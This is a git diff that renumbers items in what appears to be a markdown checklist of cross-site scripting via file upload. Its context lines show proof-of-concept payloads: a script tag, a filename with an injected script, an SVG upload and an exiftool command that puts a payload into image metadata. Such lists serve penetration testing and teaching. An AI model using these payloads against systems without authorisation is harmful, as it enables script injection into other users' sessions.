@@ -97,12 +97,12 @@ Table of Contents
 ```
 <script>alert()</script>
 ```
-3. Upload PDF file<br>
+2. Upload PDF file<br>
 
 https://github.com/luigigubello/PayloadsAllThePDFs/blob/main/PDF%20Files/payload1.pdf
 
 
-4. Upload ```.SVG, .XML, .XSD, .XMP, .XSLT, .XHTML``` Files:
+3. Upload ```.SVG, .XML, .XSD, .XMP, .XSLT, .XHTML``` Files:
 ```
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <svg
@@ -157,7 +157,7 @@ image.jpeg -> image'"><script>alert()</script>.jpeg
 ```
 
 
-6. Upload file with XSS payload within metadata
+7. Upload file with XSS payload within metadata
 ```
 exiftool -Comment='"><script>alert()</script> image.jpg
 ```
